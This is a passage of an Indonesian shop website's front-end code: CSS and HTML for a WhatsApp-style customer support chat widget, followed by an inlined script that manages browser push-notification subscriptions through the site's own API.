            .chat-conversations-list::-webkit-scrollbar-thumb:hover {
                background: #8adeff;
            }
            
            /* Firefox */
            .chat-conversations-list {
                scrollbar-width: thin;
                scrollbar-color: #8adeff #f1f1f1;
            }
            
            .chat-conversation-item {
                padding: 12px 16px;
                cursor: pointer;
                display: flex;
                gap: 12px;
                align-items: flex-start;
                transition: background 0.15s ease;
                color: #8adeff;
                border-bottom: 1px solid #f0f0f0;
            }
            
            .chat-conversation-item:hover {
                background: #f5f5f5;
            }
            
            .chat-conversation-item.active {
                background: #FFF5EB;
            }
            
            /* WhatsApp-like Avatar */
            .conversation-avatar {
                width: 48px;
                height: 48px;
                border-radius: 50%;
                background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
                flex-shrink: 0;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                font-weight: 600;
                font-size: 18px;
            }
            
            .conversation-avatar svg {
                width: 24px;
                height: 24px;
            }
            
            /* WhatsApp-like Content */
            .conversation-content {
                flex: 1;
                min-width: 0;
                display: flex;
                flex-direction: column;
                gap: 4px;
            }
            
            .conversation-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                gap: 8px;
            }
            
            .conversation-name {
                font-weight: 600;
                font-size: 15px;
                color: #111;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }
            
            .conversation-time {
                font-size: 12px;
                color: #7d8166;
                flex-shrink: 0;
            }
            
            .conversation-preview {
                display: flex;
                justify-content: space-between;
                align-items: center;
                gap: 8px;
            }
            
            .conversation-message {
                font-size: 14px;
                color: #667781;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
                margin: 0;
                flex: 1;
            }
            
            .conversation-unread {
                background: #25D366;
                color: white;
                border-radius: 12px;
                padding: 2px 8px;
                font-size: 12px;
                font-weight: 600;
                min-width: 20px;
                text-align: center;
                flex-shrink: 0;
            }
            
            /* Active item styling */
            .chat-conversation-item.active .conversation-name {
                color: #8adeff;
            }
            
            .chat-conversation-item.active .conversation-time {
                color: #8adeff;
            }
            
            .chat-new-btn {
                margin: 12px;
                padding: 12px;
                background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
                color: white;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                font-weight: 500;
                font-size: 14px;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                transition: all 0.2s;
                flex-shrink: 0;
            }
            
            .chat-new-btn:hover {
                transform: translateY(-1px);
                box-shadow: 0 4px 8px rgba(242, 140, 26, 0.3);
            }
            
            .chat-conversation-title {
                flex: 1;
                font-weight: 600;
                font-size: 16px;
                color: #1f2937;
            }
            
            .chat-messages-container {
                flex: 1;
                overflow-y: auto;
                padding: 16px;
                display: flex;
                flex-direction: column;
                gap: 8px;
                min-height: 0;
                background: #E5DDD5;
            }
            
            /* Custom Scrollbar for Messages Container */
            .chat-messages-container::-webkit-scrollbar {
                width: 6px;
            }
            
            .chat-messages-container::-webkit-scrollbar-track {
                background: rgba(0, 0, 0, 0.05);
            }
            
            .chat-messages-container::-webkit-scrollbar-thumb {
                background: rgba(242, 140, 26, 0.6);
                border-radius: 3px;
            }
            
            .chat-messages-container::-webkit-scrollbar-thumb:hover {
                background: #8adeff;
            }
            
            /* Firefox */
            .chat-messages-container {
                scrollbar-width: thin;
                scrollbar-color: rgba(242, 140, 26, 0.6) rgba(0, 0, 0, 0.05);
            }
            
            /* WhatsApp Group-like Messages */
            .chat-message {
                display: flex;
                margin-bottom: 4px;
                animation: fadeIn 0.2s ease;
            }
            
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(10px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            .chat-message.mine {
                justify-content: flex-end;
            }
            
            .chat-message-bubble {
                max-width: 80%;
                padding: 6px 8px 8px 10px;
                border-radius: 8px;
                position: relative;
                box-shadow: 0 1px 0.5px rgba(0,0,0,0.13);
            }
            
            /* Bubble from others (Admin/CS) */
            .chat-message:not(.mine) .chat-message-bubble {
                background: #FFFFFF;
                border-radius: 0 8px 8px 8px;
            }
            
            /* Bubble tail for others */
            .chat-message:not(.mine) .chat-message-bubble::before {
                content: '';
                position: absolute;
                top: 0;
                left: -8px;
                width: 0;
                height: 0;
                border-style: solid;
                border-width: 0 8px 13px 0;
                border-color: transparent #FFFFFF transparent transparent;
            }
            
            /* Bubble from user (mine) */
            .chat-message.mine .chat-message-bubble {
                background: #e4f5d0; /* Light blue for user messages */
                border-radius: 8px 0 8px 8px;
            }
            
            /* Bubble tail for mine */
            .chat-message.mine .chat-message-bubble::before {
                content: '';
                position: absolute;
                top: 0;
                right: -8px;
                width: 0;
                height: 0;
                border-style: solid;
                border-width: 0 0 13px 8px;
                border-color: transparent transparent transparent #eaf5d0;
            }
            
            .message-sender {
                font-size: 12.5px;
                font-weight: 600;
                color: #8adeff !important;
                margin-bottom: 4px;
            }
            
            .chat-message.mine .message-sender {
                display: none;
            }
            
            /* Message text */
            .message-text {
                font-size: 14px;
                line-height: 19px;
                color: #ffffff !important;
                word-wrap: break-word;
                white-space: pre-wrap;
                margin-bottom: 4px;
            }
            
            /* Message metadata (time + status) */
            .message-meta {
                display: flex;
                align-items: center;
                justify-content: flex-end;
                gap: 4px;
                margin-top: 2px;
            }
            
            .message-time {
                font-size: 11px;
                color: #728166 !important;
                line-height: 15px;
            }
            
            /* Use multiple selectors to override global styles */
            .chat-message-bubble .message-status,
            .message-meta .message-status,
            .chat-message .message-status {
                width: 16px !important;
                height: 16px !important;
                min-width: 16px !important;
                min-height: 16px !important;
                max-width: 16px !important;
                max-height: 16px !important;
                flex-shrink: 0;
                color: #728166 !important;
                fill: currentColor !important;
            }
            
            .chat-message:not(.mine) .message-status {
                display: none;
            }
            
            /* Loading dots animation */
            @keyframes loadingDots {
                0%, 20% { content: '.'; }
                40% { content: '..'; }
                60%, 100% { content: '...'; }
            }
            
            .message-status.loading::after {
                content: '...';
                animation: loadingDots 1.5s infinite;
                font-size: 16px;
                line-height: 16px;
            }
            
            .message-status.loading path {
                display: none;
            }
            
            .message-status.failed {
                color: #8adeff !important;
                cursor: pointer;
            }
            
            .message-status.sent {
                color: #667781 !important;
            }
            
            .chat-new-form {
                flex: 1;
                overflow-y: auto;
                padding: 16px;
                display: flex;
                flex-direction: column;
            }
            
            .chat-new-form form {
                display: flex;
                flex-direction: column;
                gap: 16px;
                flex: 1;
            }
            
            .chat-new-form .form-group {
                display: flex;
                flex-direction: column;
                gap: 6px;
            }
            
            .chat-new-form label {
                font-size: 14px;
                font-weight: 500;
                color: #374151;
            }
            
            .chat-new-form .form-control {
                width: 100%;
                padding: 10px 12px;
                border: 1px solid #d1d5db;
                border-radius: 8px;
                font-size: 14px;
                font-family: inherit;
                transition: border-color 0.2s;
                box-sizing: border-box;
            }
            
            .chat-new-form .form-control:focus {
                outline: none;
                border-color: #8adeff;
                box-shadow: 0 0 0 3px rgba(242, 140, 26, 0.1);
            }
            
            .chat-new-form textarea.form-control {
                resize: vertical;
                min-height: 100px;
            }
            
            .chat-new-form .btn {
                padding: 12px 20px;
                border: none;
                border-radius: 8px;
                font-size: 15px;
                font-weight: 500;
                cursor: pointer;
                transition: all 0.2s;
                text-align: center;
            }
            
            .chat-new-form .btn-primary {
                background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
                color: white;
            }
            
            .chat-new-form .btn-primary:hover {
                transform: translateY(-1px);
                box-shadow: 0 4px 8px rgba(242, 140, 26, 0.3);
            }
            
            .chat-new-form .btn-primary:active {
                transform: scale(0.98);
            }
            
            .chat-new-form .btn-block {
                width: 100%;
                margin-top: auto;
            }
            
            .chat-message-form {
                padding: 12px;
                border-top: 1px solid #e5e7eb;
                display: flex;
                flex-wrap: wrap;
                gap: 8px;
                align-items: flex-end;
                flex-shrink: 0;
                background: white;
            }
            
            .chat-product-card {
                flex: 1 1 100%;
                max-width: 100%;
                display: flex;
                gap: 12px;
                padding: 12px;
                background: #f3f4f6;
                border-radius: 8px;
                margin-bottom: 4px;
                border: 1px solid #e5e7eb;
            }
            
            .chat-product-card img {
                width: 60px;
                height: 60px;
                object-fit: cover;
                border-radius: 6px;
                flex-shrink: 0;
            }
            
            .chat-product-card-content {
                flex: 1;
                min-width: 0;
            }
            
            .chat-product-card-name {
                font-weight: 500;
                font-size: 14px;
                color: #1f2937;
                margin-bottom: 4px;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }
            
            .chat-product-card-variant {
                font-size: 12px;
                color: #74806b;
                margin-bottom: 4px;
            }
            
            .chat-product-card-price {
                font-size: 13px;
                color: #8bea66;
                font-weight: 600;
            }
            
            .chat-product-card-remove {
                align-self: flex-start;
                background: none;
                border: none;
                color: #9ca3af;
                cursor: pointer;
                padding: 4px;
                font-size: 18px;
                line-height: 1;
                transition: color 0.2s;
            }
            
            .chat-product-card-remove:hover {
                color: #8adeff;
            }
            
            /* Product card in messages (read-only display) */
            .message-product-card {
                display: flex;
                gap: 10px;
                padding: 10px;
                background: rgba(255, 255, 255, 0.5);
                border-radius: 8px;
                margin-bottom: 6px;
                border: 1px solid rgba(0, 0, 0, 0.08);
                align-items: center;
            }
            
            .chat-message.mine .message-product-card {
                background: rgba(255, 255, 255, 0.7);
            }
            
            .message-product-card img {
                width: 50px;
                height: 50px;
                object-fit: cover;
                border-radius: 6px;
                flex-shrink: 0;
            }
            
            .message-product-info {
                flex: 1;
                min-width: 0;
            }
            
            .message-product-name {
                font-weight: 500;
                font-size: 13px;
                color: #8adeff;
                margin-bottom: 2px;
                overflow: hidden;
                text-overflow: ellipsis;
                display: -webkit-box;
                -webkit-line-clamp: 2;
                -webkit-box-orient: vertical;
                line-height: 1.3;
            }
            
            .message-product-variant {
                font-size: 11px;
                color: #78806b;
                margin-bottom: 2px;
            }
            
            .message-product-price {
                font-size: 12px;
                color: #c7ea66;
                font-weight: 600;
            }
            
            .message-product-link {
                flex-shrink: 0;
                width: 32px;
                height: 32px;
                display: flex;
                align-items: center;
                justify-content: center;
                background: rgba(102, 126, 234, 0.1);
                border-radius: 6px;
                color: #c7ea66;
                text-decoration: none;
                transition: all 0.2s;
            }
            
            .message-product-link:hover {
                background: #b7ea66;
                color: white;
            }
            
            .message-product-link svg {
                width: 16px;
                height: 16px;
            }
            
            .chat-message-input {
                flex: 1;
                border: 1px solid #d1d5db;
                border-radius: 20px;
                padding: 10px 16px;
                resize: none;
                max-height: 100px;
                font-family: inherit;
                font-size: 14px;
                line-height: 1.5;
                box-sizing: border-box;
                overflow-y: hidden;
            }
            
            .chat-message-input:focus {
                outline: none;
                border-color: #8adeff;
                box-shadow: 0 0 0 3px rgba(242, 140, 26, 0.1);
            }
            
            .chat-send-btn {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
                border: none;
                color: white;
                cursor: pointer;
                flex-shrink: 0;
                display: flex;
                align-items: center;
                justify-content: center;
                transition: all 0.2s;
            }
            
            .chat-send-btn:hover {
                transform: scale(1.05);
                box-shadow: 0 2px 8px rgba(242, 140, 26, 0.3);
            }
            
            .chat-send-btn:active {
                transform: scale(0.95);
            }
            
            .chat-loading {
                text-align: center;
                padding: 20px;
                color: #6b7280;
            }
            
            /* Date Separator (WhatsApp-style) */
            .date-separator {
                display: flex;
                align-items: center;
                gap: 12px;
                margin: 24px 0 16px;
                opacity: 0;
                animation: fadeInSeparator 0.3s ease forwards;
            }

            @keyframes fadeInSeparator {
                from {
                    opacity: 0;
                    transform: translateY(-10px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }

            .date-separator-line {
                flex: 1;
                height: 1px;
                background: linear-gradient(90deg, transparent, rgba(0, 0, 0, 0.1) 50%, transparent);
            }

            .date-separator-text {
                flex-shrink: 0;
                padding: 4px 12px;
                background: #e9ecef;
                color: #6c757d;
                font-size: 11px;
                font-weight: 600;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                border-radius: 12px;
                box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
            }
            
            /* Mobile responsive */
            @media (max-width: 640px) {
                .chat-popup {
                    position: fixed !important; /* Override absolute positioning */
                    bottom: 45px !important; /* Above bottom nav */
                    right: 0 !important;
                    left: 0 !important;
                    width: 100% !important;
                    max-width: 100% !important;
                    /* Use dvh (dynamic viewport height) for browser UI awareness */
                    height: calc(100dvh - 45px) !important;
                    max-height: calc(100dvh - 45px) !important;
                    /* Fallback for browsers that don't support dvh */
                    height: calc(var(--viewport-height, 100vh) - 45px) !important;
                    max-height: calc(var(--viewport-height, 100vh) - 45px) !important;
                    border-radius: 0 !important;
                    z-index: 9999 !important;
                }
                
                .chat-popup-header {
                    border-radius: 0;
                }
                
                .chat-messages-container,
                .chat-conversations-list {
                    /* Adjust for mobile keyboard using dynamic viewport */
                    max-height: calc(100dvh - 190px);
                    /* Fallback for browsers that don't support dvh */
                    max-height: calc(var(--viewport-height, 100vh) - 190px);
                }
            }
        </style>
                <!-- Chat Widget Button -->
        <div id="chat-widget" class="chat-widget" 
             data-user-id=""
             data-is-logged-in="false"
             data-csrf-token="df5d776748b1ed8c8dd0d987bae99b1ee3dea6c6dcbe0eedb1bea766c56d569a">
            <button id="chat-toggle-btn" class="chat-toggle-btn" aria-label="Toggle chat">
                <svg class="chat-icon" width="28" height="28" viewBox="0 0 640 640" fill="currentColor">
                    <path d="M320 128C241 128 175.3 185.3 162.3 260.7C171.6 257.7 181.6 256 192 256L208 256C234.5 256 256 277.5 256 304L256 400C256 426.5 234.5 448 208 448L192 448C139 448 96 405 96 352L96 288C96 164.3 196.3 64 320 64C443.7 64 544 164.3 544 288L544 456.1C544 522.4 490.2 576.1 423.9 576.1L336 576L304 576C277.5 576 256 554.5 256 528C256 501.5 277.5 480 304 480L336 480C362.5 480 384 501.5 384 528L384 528L424 528C463.8 528 496 495.8 496 456L496 435.1C481.9 443.3 465.5 447.9 448 447.9L432 447.9C405.5 447.9 384 426.4 384 399.9L384 303.9C384 277.4 405.5 255.9 432 255.9L448 255.9C458.4 255.9 468.3 257.5 477.7 260.6C464.7 185.3 399.1 127.9 320 127.9z"/>
                </svg>
                <span id="chat-unread-badge" class="chat-unread-badge" style="display: none;">0</span>
            </button>
            
            <div id="chat-popup" class="chat-popup" style="display: none;">
                <div class="chat-popup-header">
                    <div class="chat-header-title">
                        <h3>Bantuan</h3>
                        <span id="chatOperatingHours" class="chat-operating-hours" style="display: none;"></span>
                    </div>
                    <div class="chat-header-actions">
                        <button id="chatNotifToggle" class="btn-notif-toggle" data-status="not-supported" title="Push notification" style="display: none;">
                            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                                <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/>
                            </svg>
                        </button>
                        <button id="chat-close-btn" class="chat-close-btn" aria-label="Close chat">Ã—</button>
                    </div>
                </div>
                
                <!-- Notification Info Bar (conditional) -->
                <div class="chat-notif-info-bar" id="chatNotifInfoBar" style="display:none;">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="#8adeff">
                        <path d="M9 21c0 .55.45 1 1 1h4c.55 0 1-.45 1-1v-1H9v1zm3-19C8.14 2 5 5.14 5 9c0 2.38 1.19 4.47 3 5.74V17c0 .55.45 1 1 1h6c.55 0 1-.45 1-1v-2.26c1.81-1.27 3-3.36 3-5.74 0-3.86-3.14-7-7-7zm2.85 11.1l-.85.6V16h-4v-2.3l-.85-.6C7.8 12.16 7 10.63 7 9c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.63-.8 3.16-2.15 4.1z"/>
                    </svg>
                    <span class="small">Aktifkan notifikasi untuk pemberitahuan balasan</span>
                    <button class="btn-dismiss" onclick="ChatNotification.dismissInfo()">âœ•</button>
                </div>
                
                <div class="chat-popup-body">
                    <!-- Conversations List View -->
                    <div id="chat-list-view" class="chat-view">
                        <div id="chat-conversations-list" class="chat-conversations-list">
                            <div class="chat-loading">Memuat...</div>
                            <!-- Conversation Item Structure (rendered by JS):
                            <div class="chat-conversation-item">
                                <div class="conversation-avatar">
                                    <svg>...</svg>
                                </div>
                                <div class="conversation-content">
                                    <div class="conversation-header">
                                        <span class="conversation-name">Admin Support</span>
                                        <span class="conversation-time">10:30</span>
                                    </div>
                                    <div class="conversation-preview">
                                        <p class="conversation-message">Terima kasih telah menghubungi kami...</p>
                                        <span class="conversation-unread">2</span>
                                    </div>
                                </div>
                            </div>
                            -->
                        </div>
                        <button id="chat-new-btn" class="chat-new-btn">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <line x1="12" y1="5" x2="12" y2="19"></line>
                                <line x1="5" y1="12" x2="19" y2="12"></line>
                            </svg>
                            Percakapan Baru
                        </button>
                    </div>
                    
                    <!-- Chat Messages View -->
                    <div id="chat-messages-view" class="chat-view" style="display: none;">
                        <div id="chat-messages-container" class="chat-messages-container">
                            <div class="chat-loading">Memuat pesan...</div>
                            <!-- Message Structure (rendered by JS):
                            <div class="chat-message"> (or .chat-message.mine)
                                <div class="chat-message-bubble">
                                    <div class="message-sender">Admin Support</div> (only for non-mine)
                                    <div class="message-text">Halo, ada yang bisa dibantu?</div>
                                    <div class="message-meta">
                                        <span class="message-time">10:30</span>
                                        <svg class="message-status">...</svg> (only for mine)
                                    </div>
                                </div>
                            </div>
                            -->
                        </div>
                        
                        <form id="chat-message-form" class="chat-message-form">
                            <input type="hidden" id="chat-current-conversation-id" value="">
                            <textarea 
                                id="chat-message-input" 
                                class="chat-message-input" 
                                placeholder="Ketik pesan..."
                                rows="1"
                                maxlength="5000"
                            ></textarea>
                            <button type="submit" class="chat-send-btn" aria-label="Send message">
                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <line x1="22" y1="2" x2="11" y2="13"></line>
                                    <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
                                </svg>
                            </button>
                        </form>
                    </div>
                    
                    <!-- New Chat View -->
                    <div id="chat-new-view" class="chat-view" style="display: none;">
                        <div class="chat-messages-header">
                            <button id="chat-new-back-btn" class="chat-back-btn" aria-label="Back to list">
                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <path d="M19 12H5M12 19l-7-7 7-7"/>
                                </svg>
                            </button>
                            <div class="chat-conversation-title">Percakapan Baru</div>
                        </div>
                        
                        <div class="chat-new-form">
                            <form id="chat-start-form">
                                <div class="form-group">
                                    <label for="chat-new-subject">Subjek</label>
                                    <input 
                                        type="text" 
                                        id="chat-new-subject" 
                                        class="form-control" 
                                        placeholder="Bantuan Pelanggan"
                                        maxlength="255"
                                    >
                                </div>
                                <div class="form-group">
                                    <label for="chat-new-message">Pesan</label>
                                    <textarea 
                                        id="chat-new-message" 
                                        class="form-control" 
                                        rows="4" 
                                        placeholder="Tulis pertanyaan Anda..."
                                        required
                                        maxlength="5000"
                                    ></textarea>
                                </div>
                                <button type="submit" class="btn btn-primary btn-block">Kirim</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Login Required Modal -->
        <div class="modal-overlay" id="chatLoginModal">
            <div class="modal-dialog">
                <div class="modal-header">
                    <h3 class="modal-title">
                        <div class="modal-icon info">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                                <path d="M11,9H13V7H11M12,20C7.59,20 4,16.41 4,12C4,7.59 7.59,4 12,4C16.41,4 20,7.59 20,12C20,16.41 16.41,20 12,20M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M11,17H13V11H11V17Z"/>
                            </svg>
                        </div>
                        Login Diperlukan
                    </h3>
                </div>
                <div class="modal-body">
                    <p class="modal-message">Anda harus login terlebih dahulu untuk menggunakan fitur chat bantuan pelanggan.</p>
                    <div class="modal-actions">
                        <button class="modal-btn modal-btn-secondary" id="chatLoginCancel">Batal</button>
                        <button class="modal-btn modal-btn-primary" id="chatLoginConfirm">Login Sekarang</button>
                    </div>
                </div>
            </div>
        </div>
        <script src="https://plazait.co.id/assets/js/chat-widget.js" nonce="se3iyzEHMc9FQEB4wSyd0w=="></script><script data-inlined="chat-notification.js">
/**
 * Customer Chat Push Notification Manager
 * Handles browser push notification subscription for customers
 * Version: 1.0.0
 * Date: 2026-01-19
 */

const ChatNotification = {
    // State
    status: 'not-supported', // not-supported, not-subscribed, subscribed, blocked
    subscription: null,
    vapidPublicKey: null, // Will be loaded from server
    
    /**
     * Initialize notification manager
     */
    async init() {
        // Check if user is logged in (only for logged-in users)
        if (!this.isUserLoggedIn()) {
            this.updateUI('not-supported');
            return;
        }
        
        // Check browser support
        if (!this.isSupported()) {
            this.updateUI('not-supported');
            return;
        }
        
        // Load VAPID key from server
        await this.loadVapidKey();
        
        if (!this.vapidPublicKey) {
            this.updateUI('not-supported');
            return;
        }
        
        // Register service worker if needed
        await this.registerServiceWorker();
        
        // Check current permission
        const permission = Notification.permission;
        
        if (permission === 'denied') {
            this.updateUI('blocked');
        } else if (permission === 'granted') {
            // Check if already subscribed
            const isSubscribed = await this.checkSubscriptionStatus();
            this.updateUI(isSubscribed ? 'subscribed' : 'not-subscribed');
        } else {
            // Default: not subscribed yet
            this.updateUI('not-subscribed');
            this.showInfoBar();
        }
    },
    
    /**
     * Check if user is logged in
     */
    isUserLoggedIn() {
        const metaTag = document.querySelector('meta[name="user-logged-in"]');
        return metaTag ? metaTag.getAttribute('content') === 'true' : false;
    },
    
    /**
     * Check if browser supports push notifications
     */
    isSupported() {
        return (
            'serviceWorker' in navigator &&
            'PushManager' in window &&
            'Notification' in window
        );
    },
    
    /**
     * Load VAPID public key from server
     */
    async loadVapidKey() {
        try {
            const response = await fetch('/api/chat/notifications/vapid_key', {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (!response.ok) {
                return false;
            }
            
            const data = await response.json();
            if (data.success && data.data?.public_key) {
                this.vapidPublicKey = data.data.public_key;
                return true;
            }
            
            return false;
            
        } catch (error) {
            console.error('[ChatNotification] Error loading VAPID key:', error);
            return false;
        }
    },
    
    /**
     * Register service worker
     */
    async registerServiceWorker() {
        if (!('serviceWorker' in navigator)) return null;
        
        try {
            const registration = await navigator.serviceWorker.register('/sw-push.js', {
                scope: '/'
            });
            return registration;
        } catch (error) {
            return null;
        }
    },
    
    /**
     * Check subscription status from server
     */
    async checkSubscriptionStatus() {
        try {
            const response = await fetch('/api/chat/notifications/status', {
                method: 'GET',
                credentials: 'include',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (!response.ok) {
                return false;
            }
            
            const data = await response.json();
            return data.data?.subscribed || false;
            
        } catch (error) {
            console.error('[ChatNotification] Error checking subscription:', error);
            return false;
        }
    },
    
    /**
     * Update UI based on status
     */
    updateUI(status) {
        this.status = status;
        const btn = document.getElementById('chatNotifToggle');
        
        if (!btn) {
            // Retry after a short delay (button might not be in DOM yet)
            setTimeout(() => this.updateUI(status), 100);
            return;
        }
        
        btn.setAttribute('data-status', status);
        
        // Show/hide button based on support
        if (status === 'not-supported') {
            btn.style.display = 'none';
        } else {
            btn.style.display = 'block';
        }
        
        // Update SVG icon (bell vs bell-slash)
        const svg = btn.querySelector('svg');
        if (svg) {
            if (status === 'subscribed') {
                // Bell icon (active)
                svg.innerHTML = '<path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/>';
            } else {
                // Bell slash icon (inactive/blocked)
                svg.innerHTML = '<path d="M20 18.69L7.84 6.14 5.27 3.49 4 4.76l2.8 2.8v.01c-.52.99-.8 2.16-.8 3.42v5l-2 2v1h13.73l2 2L21 19.72l-1-1.03zM12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-7.32V11c0-3.08-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68c-.15.03-.29.08-.42.12-.1.03-.2.07-.3.11h-.01c-.01 0-.01 0-.02.01-.23.09-.46.2-.68.31 0 0-.01 0-.01.01L18 14.68z"/>';
            }
        }
        
        // Update tooltip
        const tooltips = {
            'not-subscribed': 'Klik untuk aktifkan notifikasi',
            'subscribed': 'Notifikasi aktif',
            'blocked': 'Notifikasi diblokir'
        };
        
        if (tooltips[status]) {
            btn.title = tooltips[status];
        }
        
        // Hide info bar if subscribed or blocked
        if (status === 'subscribed' || status === 'blocked') {
            this.hideInfoBar();
        }
    },
    
    /**
     * Show info bar (if not dismissed)
     */
    showInfoBar() {
        if (localStorage.getItem('chat_notif_info_dismissed')) {
            return;
        }
        
        const infoBar = document.getElementById('chatNotifInfoBar');
        const popupBody = document.getElementById('chat-popup')?.querySelector('.chat-popup-body');
        
        if (infoBar) {
            infoBar.style.display = 'flex';

            // Bind dismiss button here so it's always attached when bar is visible
            const btn = infoBar.querySelector('#chatNotifDismissBtn');
            if (btn && !btn._dismissBound) {
                btn._dismissBound = true;
                btn.addEventListener('click', () => {
                    infoBar.style.display = 'none';
                    localStorage.setItem('chat_notif_info_dismissed', '1');
                    if (popupBody) popupBody.classList.remove('has-info-bar');
                });
            }
        }
        
        if (popupBody) {
            popupBody.classList.add('has-info-bar');
        }
    },
    
    /**
     * Hide info bar
     */
    hideInfoBar() {
        const infoBar = document.getElementById('chatNotifInfoBar');
        const popupBody = document.getElementById('chat-popup')?.querySelector('.chat-popup-body');
        
        if (infoBar) {
            infoBar.style.display = 'none';
        }
        
        if (popupBody) {
            popupBody.classList.remove('has-info-bar');
        }
    },
    
    /**
     * Dismiss info bar permanently
     */
    dismissInfo() {
        this.hideInfoBar();
        localStorage.setItem('chat_notif_info_dismissed', '1');
    },
    
    /**
     * Handle bell icon click
     */
    async handleToggleClick() {
        if (this.status === 'not-subscribed') {
            await this.subscribe();
        } else if (this.status === 'subscribed') {
            await this.unsubscribe();
        } else if (this.status === 'blocked') {
            this.showUnblockHelp();
        }
    },
    
    /**
     * Subscribe to push notifications
     */
    async subscribe() {
        try {
            // Request permission
            const permission = await Notification.requestPermission();
            
            if (permission === 'denied') {
                this.updateUI('blocked');
                this.showToast('Notifikasi diblokir', 'error');
                return;
            }
            
            if (permission !== 'granted') {
                return;
            }
            
            // Get service worker registration
            const registration = await navigator.serviceWorker.ready;
            
            // Subscribe to push
            const subscription = await registration.pushManager.subscribe({
                userVisibleOnly: true,
                applicationServerKey: this.urlBase64ToUint8Array(this.vapidPublicKey)
            });
            
            // Send subscription to server
            const response = await fetch('/api/chat/notifications/subscribe', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(subscription.toJSON())
            });
            
            if (!response.ok) {
                throw new Error('Failed to save subscription');
            }
            
            const result = await response.json();
            
            this.subscription = subscription;
            this.updateUI('subscribed');
            this.hideInfoBar();
            this.showToast('Notifikasi berhasil diaktifkan!', 'success');
            
            // Send test notification
            setTimeout(() => this.sendTestNotification(), 1000);
            
        } catch (error) {
            console.error('[ChatNotification] Subscribe error:', error);
            this.showToast('Gagal mengaktifkan notifikasi', 'error');
        }
    },
    
    /**
     * Unsubscribe from push notifications
     */
    async unsubscribe() {
        try {
            // Confirm first
            if (!confirm('Nonaktifkan notifikasi chat?')) {
                return;
            }
            
            // Get current subscription
            const registration = await navigator.serviceWorker.ready;
            const subscription = await registration.pushManager.getSubscription();
            
            if (subscription) {
                // Unsubscribe from browser
                await subscription.unsubscribe();
                
                // Tell server
                await fetch('/api/chat/notifications/unsubscribe', {
                    method: 'POST',
                    credentials: 'include',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(subscription.toJSON())
                });
            }
            
            this.subscription = null;
            this.updateUI('not-subscribed');
            this.showInfoBar();
            this.showToast('Notifikasi dinonaktifkan', 'info');
            
        } catch (error) {
            console.error('[ChatNotification] Unsubscribe error:', error);
            this.showToast('Gagal menonaktifkan notifikasi', 'error');
        }
    },
    
    /**
     * Send test notification
     */
    async sendTestNotification() {
        try {
            const response = await fetch('/api/chat/notifications/send_test', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (response.ok) {
                // Test notification sent successfully
            }
        } catch (error) {
            // Test notification failed silently
        }
    },
    
    /**
     * Show unblock help modal/message
     */
    showUnblockHelp() {
        const message = `
            Notifikasi diblokir oleh browser.\n\n
            Untuk mengaktifkan:\n
            1. Klik ikon gembok/info di address bar\n
            2. Cari "Notifications" atau "Notifikasi"\n
            3. Ubah menjadi "Allow" atau "Izinkan"\n
            4. Refresh halaman ini
        `.trim().replace(/\s+/g, ' ');
        
        alert(message);
    },
    
    /**
     * Show toast notification
     */
    showToast(message, type = 'info') {
        // Simple toast implementation
        const toast = document.createElement('div');
        toast.className = `chat-toast chat-toast-${type}`;
        toast.textContent = message;
        toast.style.cssText = `
            position: fixed;
            bottom: 80px;
            right: 20px;
            background: ${type === 'success' ? '#4caf50' : type === 'error' ? '#8adeff' : '#2196f3'};
            color: white;
            padding: 12px 20px;
            border-radius: 4px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
            z-index: 10000;
            animation: slideInUp 0.3s ease;
        `;
        
        document.body.appendChild(toast);
        
        setTimeout(() => {
